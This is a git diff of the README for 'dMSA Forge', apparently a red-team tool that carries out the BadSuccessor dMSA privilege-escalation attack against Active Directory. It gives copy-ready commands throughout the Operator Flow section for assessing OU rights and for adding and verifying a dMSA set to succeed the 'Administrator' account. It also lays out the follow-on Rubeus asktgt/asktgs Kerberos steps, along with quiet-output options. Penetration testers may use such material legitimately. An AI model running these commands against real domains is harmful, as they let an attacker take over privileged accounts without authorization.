@@ -1,14 +1,14 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.8)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.9)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **Language:** English | [简体中文](assets/README.zh-CN.md) | [Français](assets/README.fr.md)
 
-Current release: `v0.5.8`
+Current release: `v0.5.9`
 
-A [dMSA](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge for authorized [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP workflows: add, verify, delete, and search.
+A [dMSA](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge for authorized [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP workflows: assess, add, verify, and delete.
 
 Designed around signed LDAP 389, atomic dMSA creation, post-add verification, concise operator help, project profiles, and structured reporting.
 
@@ -69,7 +69,6 @@ Useful help entry points:
 
 ```bash
 dmsa-forge add -h
-dmsa-forge add --help-advanced
 dmsa-forge update --dry-run
 ```
 
@@ -81,48 +80,56 @@ Task-named commands and modern `--long-option` flags are shown below.
 Preview an add with the safe profile. Commands in this README are intentionally shown as one-line, copy-ready examples; if you use a local wrapper such as `proxychains -f chain1080.conf -q`, place it before `dmsa-forge`.
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 By default, `DOMAIN/user` infers `--scope-domain`, `--scope-base-dn`, and `--base-dn`; LDAP/389 is the default method and port; `--dns-hostname` is inferred from `--dmsa-name` and the account domain. For `add`, explicitly choose both the account to succeed with `--target-account` and the managed-password reader with `--principals-allowed`.
+
+The templates use `redpen` as a suggested dMSA name and `Administrator` as a common predecessor-account example. Replace either value when the authorized chain targets a different object.
 
 ## Operator Flow
 
 These templates keep each command on one line for paste, terminal history, and repeatable runbooks. Replace placeholders before use.
 
+Assess OU rights:
+
+```bash
+dmsa-forge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
+```
+
 Pre-add verify:
 
 ```bash
-dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
+dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 Plan add:
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Add:
 
 ```bash
-dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Post-add verify:
 
 ```bash
-dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
+dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 Delete when finished:
 
 ```bash
-dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --yes
+dmsa-forge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --yes
 ```
 
 After a verified `add` or `verify`, `Next steps` includes concrete external Kerberos commands. The generated flow starts with `Rubeus hash`, then uses the printed AES256 value for `asktgt`, then runs the dMSA `asktgs` request.
 
-Target account resolution is LDAP-search based. `--target-account` writes `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` writes the SID used in `msDS-GroupMSAMembership`. Search-generated next steps can fill the discovered principal SID, but the target account remains an explicit operator choice.
+Target account resolution is LDAP-search based. `--target-account` writes `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` writes the SID used in `msDS-GroupMSAMembership`. Assessment-generated next steps can fill the discovered principal SID, but the target account remains an explicit operator choice.
 
 Safety controls:
 
@@ -132,7 +139,7 @@ Safety controls:
 - LDAP/389 is tried first when `--method` and `--port` are omitted. If that connection fails, dMSA Forge can try LDAPS/636 and records the attempted candidates in terminal output and JSON/text reports. A lone `--port 636` infers LDAPS; pin both `--method` and `--port` to require an exact pair.
 - `--dns-hostname` defaults to `<dmsa-name>.<account-domain>` when `--dmsa-name` is set.
 - Use `--dc-host` for a specific DC hostname and `--dc-ip` only when DNS or routing requires an IP override. Automatic DC IP resolution never probes the network; multicast, loopback, link-local, unspecified, broadcast, and reserved DNS results are rejected so proxy DNS placeholders such as `224.0.0.1` do not become Kerberos `/dc:` values.
-- For `search`, `--target-ou` narrows the OU search base. The Domain Controller prerequisite check is best-effort; if it fails, the OU search continues and records a warning.
+- For `assess`, `--target-ou` narrows the OU assessment base. The Domain Controller prerequisite check is best-effort; if it fails, the OU assessment continues and records a warning.
 - Target account and `--principals-allowed` name resolution prefer exact `sAMAccountName`/UPN/CN matches. Ambiguous LDAP results fail closed with a prompt to pass a full DN or SID.
 - `delete` requires `--yes`. The old `modify` workflow has been removed; use `delete`, `add`, and `verify` instead.
 - Local output is redacted by default. `--no-redact` requires `--debug`.
@@ -140,18 +147,20 @@ Safety controls:
 - Use `--output-only` for ultra-quiet operation. It enables `--quiet`, `--no-banner`, and defaults to `--json` unless `--output` is provided. When `--output` is used, the output file is written as JSON.
 - Use `--quiet` for warning/error-only terminal output.
 - Use `--no-banner` when embedding the tool in local scripts.
-- Use `--lean` for reduced local output and lighter search defaults (`--minimal`, `--quiet`, `--skip-dc-prereq`, `--no-banner`). `--low-noise` remains as a compatibility alias.
+- Use `--lean` for reduced local output and lighter assessment defaults (`--minimal`, `--quiet`, `--skip-dc-prereq`, `--no-banner`).
 
 Structured JSON reports include `schema_version` so automation can pin parsing behavior.
 
-Search modes:
+Human terminal output is grouped into `Run context`, `Progress`, `Findings`, and `Next steps`. Warnings and errors keep their `[!]` / `[-]` severity markers and use color only when the terminal supports it; JSON, quiet, and output-only modes stay machine-clean.
 
-- `search` defaults to OU security descriptor analysis.
-- Search results list principals with BadSuccessor-relevant OU rights, namely principals that can create dMSA objects or control the listed OUs. The tool also compares those SIDs with the bound account's `objectSid` and `tokenGroups` and marks whether each row applies to the current bind; if `tokenGroups` is unavailable, group-grant matches are reported as `unknown`.
-- Use `--summary` for a lightweight OU-only listing. `--include-security-descriptor` and `--include-sd` remain accepted explicit aliases for the default analysis mode.
+Assessment modes:
+
+- `assess` defaults to OU security descriptor analysis.
+- Assessment results list principals with BadSuccessor-relevant OU rights, namely principals that can create dMSA objects or control the listed OUs. The tool also compares those SIDs with the bound account's `objectSid` and `tokenGroups` and marks whether each row applies to the current bind; if `tokenGroups` is unavailable, group-grant matches are reported as `unknown`.
+- Use `--summary` for a lightweight OU-only listing. `--include-security-descriptor` explicitly selects the default analysis mode.
 - Add `--resolve-names` to resolve matching SIDs to names.
-- Use `--minimal` to avoid broad search analysis, name resolution, and extra Kerberos command output.
-- Add `--skip-dc-prereq` for `search` to skip the prerequisite Domain Controller OS check.
+- Use `--minimal` to avoid broad assessment analysis, name resolution, and extra Kerberos command output.
+- Add `--skip-dc-prereq` for `assess` to skip the prerequisite Domain Controller OS check.
 
 Advanced and compatibility details live in [assets/advanced.md](assets/advanced.md).
 
